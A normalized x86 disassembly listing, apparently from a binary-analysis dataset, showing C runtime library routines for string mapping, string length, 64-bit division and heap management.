jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_407020
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_408520
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_408520
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_408530
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_408530
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_408530
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_408610
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_407020
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_4086a0
add esp 0x10
sub_406ace
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_406afa
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40879e
test eax eax
pop ecx
jne r-xdata
sub_406afa
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_403c8c
push esi
call sub_4076e7
push 0x9
mov edi eax
call sub_403ced
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_406b48
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_406d6c
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_4087c0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_4087c0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_406d6c
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_406d97
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_4087c0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_4087f0
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_406ee0
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40895a
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_406b48
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_406fab
inc [ rw-data ]
push 0x1000
call sub_406abc
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_406fef
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_407020
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40709b
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4070f4
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_403c8c
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_403ced
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4070f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_4057a8
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_407160
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4071d0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_407245
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40879e
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_403c8c
push ebx
call sub_4076e7
push 0x9
mov edi eax
call sub_403ced
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_4087f0
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_4072d2
push ebx
push edi
push 0x2
xor ebx ebx
call sub_403c8c
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_403ced
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_403748
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_404e2a
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_407353
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_407391
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_4073bc
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4089e0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_4076e7
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_407aa1
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4079f0
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
